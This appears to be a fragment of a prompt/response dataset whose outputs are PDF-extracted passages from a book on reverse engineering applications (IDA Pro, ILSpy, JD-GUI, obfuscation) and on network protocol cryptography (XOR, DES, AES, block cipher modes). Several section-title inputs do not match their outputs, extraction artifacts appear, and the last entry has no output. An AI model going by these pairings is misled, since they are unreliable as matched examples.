    "output": "NOTE Although I use IDA Pro on Windows in the following discussion, the basic techniques\nare applicable to other operating systems and debuggers.\nTo run the currently disassembled executable in IDA Pro’s debugger,\npress F9. If the executable needs command line arguments, add them by\nselecting Debugger4Process Options and filling in the Parameters text\nbox in the displayed dialog. To stop debugging a running process, press\ncTRl-F2.\nSetting Breakpoints\nThe simplest way to use a debugger’s features is to set breakpoints at places of\ninterest in the disassembly, and then inspect the state of the running pro-\ngram at these breakpoints. To set a breakpoint, find an area of interest and\npress F2. The line of disassembly should turn red, indicating that the break-\npoint has been set correctly. Now, whenever the program tries to execute\nthe instruction at that breakpoint, the debugger should stop and give you\naccess to the current state of the program.\nDebugger Windows\nBy default, the IDA Pro debugger shows three important windows when the\ndebugger hits a breakpoint.\nThe EIP Window\nThe first window displays a disassembly view based on the instruction in\nthe EIP register that shows the instruction currently being executed (see\nFigure 6-14). This window works much like the disassembly window does\nwhile doing static reverse engineering. You can quickly navigate from this\nwindow to other functions and rename references (which are reflected in\nyour static disassembly). When you hover the mouse over a register, you\nshould see a quick preview of the value, which is very useful if the register\npoints to a memory address.\nFigure 6-14: The debugger EIP window\nApplication Reverse Engineering 135\nThe ESP Window\nThe debugger also shows an ESP window that reflects the current location of\nthe ESP register, which points to the base of the current thread’s stack. Here\nis where you can identify the parameters being passed to function calls or\nthe value of local variables. For example, Figure 6-15 shows the stack values\njust before calling the send function. I’ve highlighted the four parameters.\nAs with the EIP window, you can double-click references to navigate to that\nlocation.\nFigure 6-15: The debugger ESP window\nThe State of the General Purpose Registers\nThe General registers default window shows the current state of the general\npurpose registers. Recall that registers are used to store the current values\nof various program states, such as loop counters and memory addresses.\nFor memory addresses, this window provides a convenient way to navigate\nto a memory view window: click the arrow next to each address to navigate\nfrom the last active memory window to the memory address corresponding\nto that register value.\nTo create a new memory window, right-click the array and select Jump\nin new window. You’ll see the condition flags from the EFLAGS register on\nthe right side of the window, as shown in Figure 6-16.\nFigure 6-16: The General registers window\n136 Chapter 6"
  },
  {
    "input": ".NET Applications",
    "output": "Where to Set Breakpoints?\nWhere are the best places to set breakpoints when you’re investigating a\nnetwork protocol? A good first step is to set breakpoints on calls to the\nsend and recv functions, which send and receive data from the network\nstack. Cryptographic functions are also a good target: you can set break-\npoints on functions that set the encryption key or the encryption and\ndecryption functions. Because the debugger synchronizes with the static\ndisassembler in IDA Pro, you can also set breakpoints on code areas that\nappear to be building network protocol data. By stepping through instruc-\ntions with breakpoints, you can better understand how the underlying\nalgorithms work.\nreverse engineering Managed languages\nNot all applications are distributed as native executables. For example,\napplications written in managed languages like .NET and Java compile to an\nintermediate machine language, which is commonly designed to be CPU\nand operating system agnostic. When the application is executed, a virtual\nmachine or runtime executes the code. In .NET this intermediate machine\nlanguage is called common intermediate language (CIL); in Java it’s called Java\nbyte code.\nThese intermediate languages contain substantial amounts of meta-\ndata, such as the names of classes and all internal- and external-facing\nmethod names. Also, unlike for native-compiled code, the output of\nmanaged languages is fairly predictable, which makes them ideal for\ndecompiling.\nIn the following sections, I’ll examine how .NET and Java applications\nare packaged. I’ll also demonstrate a few tools you can use to reverse engi-\nneer .NET and Java applications efficiently.\n.NET Applications\nThe .NET runtime environment is called the common language runtime\n(CLR). A .NET application relies on the CLR as well as a large library of\nbasic functionality called the base class library (BCL).\nAlthough .NET is primarily a Microsoft Windows platform (it is devel-\noped by Microsoft after all), a number of other, more portable versions are\navailable. The best known is the Mono Project, which runs on Unix-like\nsystems and covers a wide range of CPU architectures, including SPARC\nand MIPS.\nIf you look at the files distributed with a .NET application, you’ll see\nfiles with .exe and .ddl extensions, and you’d be forgiven for assuming\nthey’re just native executables. But if you load these files into an x86 dis-\nassembler, you’ll be greeted with a message similar to the one shown in\nFigure 6-17.\nApplication Reverse Engineering 137"
  },
  {
    "input": "Using ILSpy",
    "output": "Figure 6-17: A .NET executable in an\nx86 disassembler\nAs it turns out, .NET only uses the .exe and .dll file formats as conve-\nnient containers for the CIL code. In the .NET runtime, these containers\nare referred to as assemblies.\nAssemblies contain one or more classes, enumerations, and/or\nstructures. Each type is referred to by a name, typically consisting of a\nnamespace and a short name. The namespace reduces the likelihood of\nconflicting names but can also be useful for categorization. For example,\nany types under the namespace System.Net deal with network functionality.\nUsing ILSpy\nYou’ll rarely, if ever, need to interact with raw CIL because tools like\nReflector (https://www.red-gate.com/products/dotnet-development/reflector/)\nand ILSpy (http://ilspy.net/) can decompile CIL data into C# or Visual\nBasic source and display the original CIL. Let’s look at how to use ILSpy,\na free open source tool that you can use to find an application’s network\nfunctionality. Figure 6-18 shows ILSpy’s main interface.\nThe interface is split into two windows. The left window  is a tree-\nbased listing of all assemblies that ILSpy has loaded. You can expand the\ntree view to see the namespaces and the types an assembly contains . The\nright window shows disassembled source code . The assembly you select in\nthe left window is expanded on the right.\nTo work with a .NET application, load it into ILSpy by pressing cTRl+O\nand selecting the application in the dialog. If you open the application’s\nmain executable file, ILSpy should automatically load any assembly refer-\nenced in the executable as necessary.\nWith the application open, you can search for the network function-\nality. One way to do so is to search for types and members whose names\nsound like network functions. To search all loaded assemblies, press F3. A\nnew window should appear on the right side of your screen, as shown in\nFigure 6-19.\n138 Chapter 6\n(cid:31) (cid:29)\n(cid:30)\nFigure 6-18: The ILSpy main interface\n(cid:31) (cid:30)\n(cid:29)\nFigure 6-19: The ILSpy Search window\nApplication Reverse Engineering 139\nEnter a search term at  to filter out all loaded types and display them\nin the window below. You can also search for members or constants by\nselecting them from the drop-down list at . For example, to search for\nliteral strings, select Constant. When you’ve found an entry you want to\ninspect, such as TcpNetworkListener , double-click it and ILSpy should\nautomatically decompile the type or method.\nRather than directly searching for specific types and members, you can\nalso search an application for areas that use built-in network or cryptogra-\nphy libraries. The base class library contains a large set of low-level socket\nAPIs and libraries for higher-level protocols, such as HTTP and FTP. If you\nright-click a type or member in the left window and select Analyze, a new\nwindow should appear, as shown at the right side of Figure 6-20.\n(cid:31)\n(cid:30)\n(cid:29)\nFigure 6-20: ILSpy analyzing a type\nThis new window is a tree, which when expanded, shows the types of\nanalyses that can be performed on the item you selected in the left window.\nYour options will depend on what you selected to analyze. For example, ana-\nlyzing a type  shows three options, although you’ll typically only need to\nuse the following two forms of analysis:\nInstantiated By Shows which methods create new instances of this type\nExposed By Shows which methods or properties use this type in their\ndeclaration or parameters\n140 Chapter 6"
  },
  {
    "input": "Java Applications",
    "output": "If you analyze a member, a method, or a property, you’ll get two\noptions :\nUses Shows what other members or types the selected member uses\nUsed By Shows what other members use the selected member (say, by\ncalling the method)\nYou can expand all entries .\nAnd that’s pretty much all there is to statically analyzing a .NET appli-\ncation. Find some code of interest, inspect the decompiled code, and then\nstart analyzing the network protocol.\nNOTE Most of .NET’s core functionality is in the base class library distributed with the\n.NET runtime environment and available to all .NET applications. The assemblies\nin the BCL provide several basic network and cryptographic libraries, which applica-\ntions are likely to need if they implement a network protocol. Look for areas that refer-\nence types in the System.Net and System.Security.Cryptography namespaces. These\nare mostly implemented in the MSCORLIB and System assemblies. If you can trace\nback from calls to these important APIs, you’ll discover where the application handles\nthe network protocol.\nJava Applications\nJava applications differ from .NET applications in that the Java compiler\ndoesn’t merge all types into a single file; instead, it compiles each source\ncode file into a single Class file with a .class extension. Because separate Class\nfiles in filesystem directories aren’t very convenient to transfer between sys-\ntems, Java applications are often packaged into a Java archive, or JAR. A JAR\nfile is just a ZIP file with a few additional files to support the Java runtime.\nFigure 6-21 shows a JAR file opened in a ZIP decompression program.\nFigure 6-21: An example JAR file opened with a ZIP application\nApplication Reverse Engineering 141\nTo decompile Java programs, I recommend using JD-GUI (http://jd.benow\n.ca/), which works in essentially the same as ILSpy when decompiling .NET\napplications. I won’t cover using JD-GUI in depth but will just highlight a few\nimportant areas of the user interface in Figure 6-22 to get you up to speed.\n(cid:31)\n(cid:30) (cid:27)\n(cid:29)\n(cid:28)\n(cid:26)\nFigure 6-22: JD-GUI with an open JAR File\nFigure 6-22 shows the JD-GUI user interface when you open the JAR\nfile jce.jar , which is installed by default when you install Java and can usu-\nally be found in JAVAHOME/lib. You can open individual class files or mul-\ntiple JAR files at one time depending on the structure of the application\nyou’re reverse engineering. When you open a JAR file, JD-GUI will parse the\nmetadata as well as the list of classes, which it will present in a tree structure.\nIn Figure 6-22 we can see two important piece of information JD-GUI has\nextracted. First, a package named javax.crypto , which defines the classes\nfor various Java cryptographic operations. Underneath the package name is\nlist of classes defined in that package, such as CryptoAllPermissionCollection\n.class . If you click the class name in the left window, a decompiled version\nof the class will be shown on the right x. You can scroll through the decom-\npiled code, or click on the fields and methods exposed by the class y to\njump to them in the decompiled code window.\nThe second important thing to note is that any identifier underlined in\nthe decompiled code can be clicked, and the tool will navigate to the defini-\ntion. If you clicked the underlined all_allowed identifier z, the user inter-\nface would navigate to the definition of the all_allowed field in the current\ndecompiled class.\n142 Chapter 6"
  },
  {
    "input": "Dealing with Obfuscation",
    "output": "Dealing with Obfuscation\nAll the metadata included with a typical .NET or Java application makes\nit easier for a reverse engineer to work out what an application is doing.\nHowever, commercial developers, who employ special “secret sauce” net-\nwork protocols, tend to not like the fact that these applications are much\neasier to reverse engineer. The ease with which these languages are decom-\npiled also makes it relatively straightforward to discover horrible security\nholes in custom network protocols. Some developers might not like you\nknowing this, so they use obscurity as a security solution.\nYou’ll likely encounter applications that are intentionally obfuscated\nusing tools such as ProGuard for Java or Dotfuscator for .NET. These tools\napply various modifications to the compiled application that are designed\nto frustrate a reverse engineer. The modification might be as simple as\nchanging all the type and method names to meaningless values, or it might\nbe more elaborate, such as employing runtime decryption of strings and\ncode. Whatever the method, obfuscation will make decompiling the code\nmore difficult. For example, Figure 6-23 shows an original Java class next\nto its obfuscated version, which was obtained after running it through\nProGuard.\nOriginal Obfuscated\nFigure 6-23: Original and obfuscated class file comparison\nIf you encounter an obfuscated application, it can be difficult to deter-\nmine what it’s doing using normal decompilers. After all, that’s the point of\nthe obfuscation. However, here are a few tips to use when tackling them:\n• Keep in mind that external library types and methods (such as core\nclass libraries) cannot be obfuscated. Calls to the socket APIs must\nexist in the application if it does any networking, so search for them.\nApplication Reverse Engineering 143"
  },
  {
    "input": "Final Words",
    "output": "• Because .NET and Java are easy to load and execute dynamically, you\ncan write a simple test harness to load the obfuscated application and\nrun the string or code decryption routines.\n• Use dynamic reverse engineering as much as possible to inspect types\nat runtime to determine what they’re used for.\nreverse engineering resources\nThe following URLs provide access to excellent information resources\nfor reverse engineering software. These resources provide more details\non reverse engineering or other related topics, such as executable file\nformats.\n• OpenRCE Forums: http://www.openrce.org/\n• ELF File Format: http://refspecs.linuxbase.org/elf/elf.pdf\n• macOS Mach-O Format: https://web.archive.org/web/20090901205800/\nhttp://developer.apple.com/mac/library/documentation/DeveloperTools/\nConceptual/MachORuntime/Reference/reference.html\n• PE File Format: https://msdn.microsoft.com/en-us/library/windows/desktop/\nms680547(v=vs.85).aspx\nFor more information on the tools used in this chapter, including\nwhere to download them, turn to Appendix A.\nFinal words\nReverse engineering takes time and patience, so don’t expect to learn it\novernight. It takes time to understand how the operating system and the\narchitecture work together, to untangle the mess that optimized C can pro-\nduce in the disassembler, and to statically analyze your decompiled code. I\nhope I’ve given you some useful tips on reverse engineering an executable\nto find its network protocol code.\nThe best approach when reverse engineering is to start on small exe-\ncutables that you already understand. You can compare the source of these\nsmall executables to the disassembled machine code to better understand\nhow the compiler translated the original programming language.\nOf course, don’t forget about dynamic reverse engineering and using\na debugger whenever possible. Sometimes just running the code will be a\nmore efficient method than static analysis. Not only will stepping through\na program help you to better understand how the computer architecture\nworks, but it will also allow you to analyze a small section of code fully. If\nyou’re lucky, you might get to analyze a managed language executable writ-\nten in .NET or Java using one of the many tools available. Of course, if the\ndeveloper has obfuscated the executable, analysis becomes more difficult,\nbut that’s part of the fun of reverse engineering.\n144 Chapter 6"
  },
  {
    "input": "Chapter 7: Network Protocol Security\r",
    "output": "7\nNE T WORK P ROTOCOL SEC uRIT y\nNetwork protocols transfer information between par-\nticipants in a network, and there’s a good chance that\ninformation is sensitive. Whether the information\nincludes credit card details or top secret information\nfrom government systems, it’s important to provide\nsecurity. Engineers consider many requirements for security when they\ninitially design a protocol, but vulnerabilities often surface over time, espe-\ncially when a protocol is used on public networks where anyone monitoring\ntraffic can attack it.\nAll secure protocols should do the following:\n• Maintain data confidentiality by protecting data from being read\n• Maintain data integrity by protecting data from being modified"
  },
  {
    "input": "Encryption Algorithms",
    "output": "• Prevent an attacker from impersonating the server by implementing\nserver authentication\n• Prevent an attacker from impersonating the client by implementing cli-\nent authentication\nIn this chapter, I’ll discuss ways in which these four requirements are\nmet in common network protocols, address potential weaknesses to look\nout for when analyzing a protocol, and describe how these requirements\nare implemented in a real-world secure protocol. I’ll cover how to identify\nwhich protocol encryption is in use or what flaws to look for in subsequent\nchapters.\nThe field of cryptography includes two important techniques many net-\nwork protocols use, both of which protect data or a protocol in some way:\nencryption provides data confidentiality, and signing provides data integrity\nand authentication.\nSecure network protocols heavily use encryption and signing, but\ncryptography can be difficult to implement correctly: it’s common to find\nimplementation and design mistakes that lead to vulnerabilities that can\nbreak a protocol’s security. When analyzing a protocol, you should have a\nsolid understanding of the technologies and algorithms involved so you can\nspot and even exploit serious weaknesses. Let’s look at encryption first to\nsee how mistakes in the implementation can compromise the security of an\napplication.\nencryption algorithms\nThe history of encryption goes back thousands of years, and as electronic\ncommunications have become easier to monitor, encryption has become\nconsiderably more important. Modern encryption algorithms often rely on\nvery complex mathematical models. However, just because a protocol uses\ncomplex algorithms doesn’t mean it’s secure.\nWe usually refer to an encryption algorithm as a cipher or code depend-\ning on how it’s structured. When discussing the encrypting operation, the\noriginal, unencrypted message is referred to as plaintext. The output of the\nencryption algorithm is an encrypted message called cipher text. The major-\nity of algorithms also need a key for encryption and decryption. The effort\nto break or weaken an encryption algorithm is called cryptanalysis.\nMany algorithms that were once thought to be secure have shown\nnumerous weaknesses and even backdoors. In part, this is due to the mas-\nsive increase in computing performance since the invention of such algo-\nrithms (some of which date back to the 1970s), making feasible attacks that\nwe once thought possible only in theory.\nIf you want to break secure network protocols, you need to understand\nsome of the well-known cryptographic algorithms and where their weak-\nnesses lie. Encryption doesn’t have to involve complex mathematics. Some\nalgorithms are only used to obfuscate the structure of the protocol on the\n146 Chapter 7"
  },
  {
    "input": "Substitution Ciphers",
    "output": "network, such as strings or numbers. Of course, if an algorithm is simple, its\nsecurity is generally low. Once the mechanism of obfuscation is discovered,\nit provides no real security.\nHere I’ll provide an overview some common encryption algorithms, but\nI won’t cover the construction of these ciphers in depth because in protocol\nanalysis, we only need to understand the algorithm in use.\nSubstitution Ciphers\nA substitution cipher is the simplest form of encryption. Substitution ciphers\nuse an algorithm to encrypt a value based on a substitution table that con-\ntains one-to-one mapping between the plaintext and the corresponding\ncipher text value, as shown in Figure 7-1. To decrypt the cipher text, the\nprocess is reversed: the cipher value is looked up in a table (that has been\nreversed), and the original plaintext value is reproduced. Figure 7-1 shows\nan example substitution cipher.\nPlaintext H E L L O\nA = Q, B = I, H = X\nSubstitution table\nE = Z, L = P, O = B\nCipher text X Z P P B\nFigure 7-1: Substitution cipher encryption\nIn Figure 7-1, the substitution table (meant as just a simple example)\nhas six defined substitutions shown to the right. In a full substitution\ncipher, many more substitutions would typically be defined. During encryp-\ntion, the first letter is chosen from the plaintext, and the plaintext letter’s\nsubstitution is then looked up in the substitution table. Here, H in HELLO\nis replaced with the letter X. This process continues until all the letters are\nencrypted.\nAlthough substitution can provide adequate protection against casual\nattacks, it fails to withstand cryptanalysis. Frequency analysis is commonly\nused to crack substitution ciphers by correlating the frequency of symbols\nfound in the cipher text with those typically found in plaintext data sets.\nFor example, if the cipher protects a message written in English, frequency\nanalysis might determine the frequency of certain common letters, punc-\ntuation, and numerals in a large body of written works. Because the letter\nE is the most common in the English language, in all probability the most\nfrequent character in the enciphered message will represent E. By following\nthis process to its logical conclusion, it’s possible to build the original substi-\ntution table and decipher the message.\nNetwork Protocol Security 147"
  },
  {
    "input": "XOR Encryption",
    "output": "XOR Encryption\nThe XOR encryption algorithm is a very simple technique for encrypt-\ning and decrypting data. It works by applying the bitwise XOR operation\nbetween a byte of plaintext and a byte of the key, which results in the cipher\ntext. For example, given the byte 0x48 and the key byte 0x82, the result of\nXORing them would be 0xCA.\nBecause the XOR operation is symmetric, applying that same key byte\nto the cipher text returns the original plaintext. Figure 7-2 shows the XOR\nencryption operation with a single-byte key.\n'H' 'e' 'l' 'l' 'o'\nPlaintext\n0x48 0x65 0x6C 0x6C 0x6F\nXOR operation\nFixed key 0x82\nCipher text 0xCA 0xE7 0xEE 0xEE 0xED\nFigure 7-2: An XOR cipher operation with a single-byte key\nSpecifying a single-byte key makes the encryption algorithm very simple\nand not very secure. It wouldn’t be difficult for an attacker to try all 256 pos-\nsible values for the key to decrypt the cipher text into plaintext, and increas-\ning the size of the key wouldn’t help. As the XOR operation is symmetric, the\ncipher text can be XORed with the known plaintext to determine the key.\nGiven enough known plaintext, the key could be calculated and applied to\nthe rest of the cipher text to decrypt the entire message.\nThe only way to securely use XOR encryption is if the key is the same\nsize as the message and the values in the key are chosen completely at ran-\ndom. This approach is called one-time pad encryption and is quite difficult to\nbreak. If an attacker knows even a small part of the plaintext, they won’t be\nable to determine the complete key. The only way to recover the key would\nbe to know the entire plaintext of the message; in that case, obviously, the\nattacker wouldn’t need to recover the key.\nUnfortunately, the one-time pad encryption algorithm has significant\nproblems and is rarely used in practice. One problem is that when using a\none-time pad, the size of the key material you send must be the same size\nas any message to the sender and recipient. The only way a one time pad\ncan be secure is if every byte in the message is encrypted with a completely\nrandom value. Also, you can never reuse a one-time pad key for different\n148 Chapter 7"
  },
  {
    "input": "Symmetric Key Cryptography",
    "output": "messages, because if an attacker can decrypt your message one time, then\nthey can recover the key, and then subsequent messages encrypted with the\nsame key are compromised.\nIf XOR encryption is so inferior, why even mention it? Well, even\nthough it isn’t “secure,” developers still use it out of laziness because it’s\neasy to implement. XOR encryption is also used as a primitive to build\nmore secure encryption algorithms, so it’s important to understand how\nit works.\nrandom number generators\nCryptographic systems heavily rely on good quality random numbers. In\nthis chapter, you’ll see them used as per-session keys, initialization vectors,\nand the large primes p and q for the RSA algorithm. However, getting truly\nrandom data is difficult because computers are by nature deterministic: any\ngiven program should produce the same output when given the same input\nand state.\nOne way to generate relatively unpredictable data is by sampling physi-\ncal processes. For example, you could time a user’s key presses on the key-\nboard or sample a source of electrical noise, such as the thermal noise in a\nresistor. The trouble with these sorts of sources is they don’t provide much\ndata—perhaps only a few hundred bytes every second at best, which isn’t\nenough for a general purpose cryptographic system. A simple 4096-bit RSA\nkey requires at least two random 256-byte numbers, which would take sev-\neral seconds to generate.\nTo make this sampled data go further, cryptographic libraries imple-\nment pseudorandom number generators (PRNGs), which use an initial seed\nvalue and generate a sequence of numbers that, in theory, shouldn’t be pre-\ndictable without knowledge of the internal state of the generator. The qual-\nity of PRNGs varies wildly between libraries: the C library function rand(),\nfor instance, is completely useless for cryptographically secure protocols. A\ncommon mistake is to use a weak algorithm to generate random numbers\nfor cryptographic uses.\nsymmetric key cryptography\nThe only secure way to encrypt a message is to send a completely random\nkey that’s the same size as the message before the encryption can take place\nas a one-time pad. Of course, we don’t want to deal with such large keys.\nFortunately, we can instead construct a symmetric key algorithm that uses\nmathematical constructs to make a secure cipher. Because the key size is\nconsiderably shorter than the message you want to send and doesn’t depend\non how much needs to be encrypted, it’s easier to distribute.\nIf the algorithm used has no obvious weakness, the limiting factor for\nsecurity is the key size. If the key is short, an attacker could brute-force the\nkey until they find the correct one.\nNetwork Protocol Security 149"
  },
  {
    "input": "Block Ciphers",
    "output": "There are two main types of symmetric ciphers: block and stream\nciphers. Each has its advantages and disadvantages, and choosing the\nwrong cipher to use in a protocol can seriously impact the security of net-\nwork communications.\nBlock Ciphers\nMany well-known symmetric key algorithms, such as the Advanced Encryption\nStandard (AES) and the Data Encryption Standard (DES), encrypt and decrypt\na fixed number of bits (known as a block) every time the encryption algo-\nrithm is applied. To encrypt or decrypt a message, the algorithm requires\na key. If the message is longer than the size of a block, it must be split into\nsmaller blocks and the algorithm applied to each in turn. Each application\nof the algorithm uses the same key, as shown in Figure 7-3. Notice that the\nsame key is used for encryption and decryption.\n0x48 0x65 0x6C 0x6C 0x6F 0x21 0x21 0x21\nPlaintext block\nKey\n0xAF 0x4D 0xBF 0xDD 0xE5 0xC0 0x47 0xA6 Encrypt\n0xF3 0x19 0xAD 0x18 0x2D 0x31 0x22 0x51\nCipher text block\n0xF3 0x19 0xAD 0x18 0x2D 0x31 0x22 0x51\nCipher text block\nDecrypt\n0x48 0x65 0x6C 0x6C 0x6F 0x21 0x21 0x21\nPlaintext block\nFigure 7-3: Block cipher encryption\nWhen a symmetric key algorithm is used for encryption, the plaintext\nblock is combined with the key as described by the algorithm, resulting in\nthe generation of the cipher text. If we then apply the decryption algorithm\ncombined with the key to the cipher text, we recover the original plaintext.\n150 Chapter 7\nDES\nProbably the oldest block cipher still used in modern applications is the\nDES, which was originally developed by IBM (under the name Lucifer)\nand was published as a Federal Information Processing Standard (FIPS) in 1979.\nThe algorithm uses a Feistel network to implement the encryption process.\nA Feistel network, which is common in many block ciphers, operates by\nrepeatedly applying a function to the input for a number of rounds. The\nfunction takes as input the value from the previous round (the original\nplaintext) as well as a specific subkey that is derived from the original key\nusing a key-scheduling algorithm.\nThe DES algorithm uses a 64-bit block size and a 64-bit key. However,\nDES requires that 8 bits of the key be used for error checking, so the effec-\ntive key is only 56 bits. The result is a very small key that is unsuitable for\nmodern applications, as was proven in 1998 by the Electronic Frontier\nFoundation’s DES cracker—a hardware-key brute-force attacker that was\nable to discover an unknown DES key in about 56 hours. At the time, the\ncustom hardware cost about $250,000; today’s cloud-based cracking tools\ncan crack a key in less than a day far more cheaply.\nTriple DES\nRather than throwing away DES completely, cryptographers developed a\nmodified form that applies the algorithm three times. The algorithm in\nTriple DES (TDES or 3DES) uses three separate DES keys, providing an effec-\ntive key size of 168 bits (although it can be proven that the security is actu-\nally lower than the size would suggest). As shown in Figure 7-4, in Triple\nDES, the DES encrypt function is first applied to the plaintext using the\nfirst key. Next, the output is decrypted using the second key. Then the out-\nput is encrypted again using the third key, resulting in the final cipher text.\nThe operations are reversed to perform decryption.\n0x48 0x65 0x6C 0x6C 0x6F 0x21 0x21 0x21\nPlaintext block\nDES\nKey 1\nencrypt DES\nKey 2 DES\ndecrypt Key 3\nencrypt\n0xF3 0x19 0xAD 0x18 0x2D 0x31 0x22 0x51\nCipher text block\nFigure 7-4: The Triple DES encryption process\nNetwork Protocol Security 151"
  },
  {
    "input": "Block Cipher Modes",
    "output": "AES\nA far more modern encryption algorithm is AES, which is based on the\nalgorithm Rijndael. AES uses a fixed block size of 128 bits and can use\nthree different key lengths: 128, 192, and 256 bits; they are sometimes\nreferred to as AES128, AES192, and AES256, respectively. Rather than\nusing a Feistel network, AES uses a substitution-permutation network, which\nconsists of two main components: substitution boxes (S-Box) and permutation\nboxes (P-Box). The two components are chained together to form a single\nround of the algorithm. As with the Feistel network, this round can be\napplied multiple times with different values of the S-Box and P-Box to pro-\nduce the encrypted output.\nAn S-Box is a basic mapping table not unlike a simple substitution\ncipher. The S-Box takes an input, looks it up in a table, and produces\noutput. As an S-Box uses a large, distinct lookup table, it’s very helpful in\nidentifying particular algorithms. The distinct lookup table provides a very\nlarge fingerprint, which can be discovered in application executables. I\nexplained this in more depth in Chapter 6 when I discussed techniques to\nfind unknown cryptographic algorithms by reverse engineering binaries.\nOther Block Ciphers\nDES and AES are the block ciphers that you’ll most commonly encounter,\nbut there are others, such as those listed in Table 7-1 (and still others in\ncommercial products).\nTable 7-1: Common Block Cipher Algorithms\nCipher name Block size (bits) Key size (bits) Year introduced\nData Encryption 64 56 1979\nStandard (DES)\nBlowfish 64 32–448 1993\nTriple Data Encryption 64 56, 112, 168 1998\nStandard (TDES/3DES)\nSerpent 128 128, 192, 256 1998\nTwofish 128 128, 192, 256 1998\nCamellia 128 128, 192, 256 2000\nAdvanced Encryption 128 128, 192, 256 2001\nStandard (AES)\nThe block and key size help you determine which cipher a protocol is\nusing based on the way the key is specified or how the encrypted data is\ndivided into blocks.\nBlock Cipher Modes\nThe algorithm of a block cipher defines how the cipher operates on blocks\nof data. Alone, a block-cipher algorithm has some weaknesses, as you’ll\n152 Chapter 7\nsoon see. Therefore, in a real-world protocol, it is common to use the block\ncipher in combination with another algorithm called a mode of operation.\nThe mode provides additional security properties, such as making the out-\nput of the encryption less predictable. Sometimes the mode also changes\nthe operation of the cipher by, for example, converting a block cipher into\na stream cipher (which I’ll explain in more detail in “Stream Ciphers” on\npage 158). Let’s take a look at some of the more common modes as well as\ntheir security properties and weaknesses.\nElectronic Code Book\nThe simplest and default mode of operation for block ciphers is Electronic\nCode Book (ECB). In ECB, the encryption algorithm is applied to each fixed-\nsize block from the plaintext to generate a series of cipher text blocks.\nThe size of the block is defined by the algorithm in use. For example, if AES\nis the cipher, each block in ECB mode must be 16 bytes in size. The plain-\ntext is divided into individual blocks, and the cipher algorithm applied.\n(Figure 7-3 showed the ECB mode at work.)\nBecause each plaintext block is encrypted independently in ECB, it\nwill always encrypt to the same block of cipher text. As a consequence, ECB\ndoesn’t always hide large-scale structures in the plaintext, as in the bitmap\nimage shown in Figure 7-5. In addition, an attacker can corrupt or manipu-\nlate the decrypted data in independent-block encryption by shuffling\naround blocks of the cipher text before it is decrypted.\nECB encrypt\nOriginal image Encrypted image\nFigure 7-5: ECB encryption of a bitmap image\nCipher Block Chaining\nAnother common mode of operation is Cipher Block Chaining (CBC), which is\nmore complex than ECB and avoids its pitfalls. In CBC, the encryption of a\nsingle plaintext block depends on the encrypted value of the previous block.\nThe previous encrypted block is XORed with the current plaintext block, and\nthen the encryption algorithm is applied to this combined result. Figure 7-6\nshows an example of CBC applied to two blocks.\nAt the top of Figure 7-6 are the original plaintext blocks. At the bottom\nis the resulting cipher text generated by applying the block-cipher algo-\nrithm as well as the CBC mode algorithm. Before each plaintext block is\nencrypted, the plaintext is XORed with the previous encrypted block. After\nthe blocks have been XORed together, the encryption algorithm is applied.\nThis ensures that the output cipher text is dependent on the plaintext as\nwell as the previous encrypted blocks.\nNetwork Protocol Security 153\n0x48 0x65 0x6C 0x6C 0x6F 0x2C 0x20 0x57\nPlaintext block 0\nIV\n0x25 0x39 0x29 0xF7 0x06 0xFA 0xCC 0x40 XOR operation\nKey\n0xAF 0x4D 0xBF 0xDD 0xE5 0xC0 0x47 0xA6 Encrypt\nCipher text block 0\n0x6A 0xB5 0xA0 0x3A 0xE4 0xF6 0x8A 0x22\n0x6F 0x72 0x6C 0x64 0x21 0x21 0x21 0x21\nPlaintext block 1\nEncrypt\nCipher text block 1\n0x8F 0xCD 0xAC 0x9E 0x4A 0xC4 0x3B 0x02\nFigure 7-6: The CBC mode of operation\nBecause the first block of plaintext has no previous cipher text block\nwith which to perform the XOR operation, you combine it with a manually\nchosen or randomly generated block called an initialization vector (IV). If the\nIV is randomly generated, it must be sent with the encrypted data, or the\nreceiver will not be able to decrypt the first block of the message. (Using a\n154 Chapter 7"
  },
  {
    "input": "Block Cipher Padding",
    "output": "fixed IV is an issue if the same key is used for all communications, because\nif the same message is encrypted multiple times, it will always encrypt to the\nsame cipher text.)\nTo decrypt CBC, the encryption operations are performed in reverse:\ndecryption happens from the end of the message to the front, decrypting\neach cipher text block with the key and at each step XORing the decrypted\nblock with the encrypted block that precedes it in the cipher text.\nAlternative Modes\nOther modes of operation for block ciphers are available, including those\nthat can convert a block cipher into a stream cipher, and special modes,\nsuch as Galois Counter Mode (GCM), which provide data integrity and confi-\ndentiality. Table 7-2 lists several common modes of operation and indicates\nwhether they generate a block or stream cipher (which I’ll discuss in the\nsection “Stream Ciphers” on page 158). To describe each in detail would\nbe outside the scope of this book, but this table provides a rough guide for\nfurther research.\nTable 7-2: Common Block Cipher Modes of Operation\nMode name Abbreviation Mode type\nElectronic Code Book ECB Block\nCipher Block Chaining CBC Block\nOutput Feedback OFB Stream\nCipher Feedback CFB Stream\nCounter CTR Stream\nGalois Counter Mode GCM Stream with data integrity\nBlock Cipher Padding\nBlock ciphers operate on a fixed-size message unit: a block. But what if you\nwant to encrypt a single byte of data and the block size is 16 bytes? This is\nwhere padding schemes come into play. Padding schemes determine how to\nhandle the unused remainder of a block during encryption and decryption.\nThe simplest approach to padding is to pad the extra block space with\na specific known value, such as a repeating-zero byte. But when you decrypt\nthe block, how do you distinguish between padding bytes and meaningful\ndata? Some network protocols specify an explicit-length field, which you\ncan use to remove the padding, but you can’t always rely on this.\nOne padding scheme that solves this problem is defined in the Public\nKey Cryptography Standard #7 (PKCS#7). In this scheme, all the padded bytes\nare set to a value that represents how many padded bytes are present. For\nexample, if three bytes of padding are present, each byte is set to the value 3,\nas shown in Figure 7-7.\nNetwork Protocol Security 155"
  },
  {
    "input": "Padding Oracle Attack",
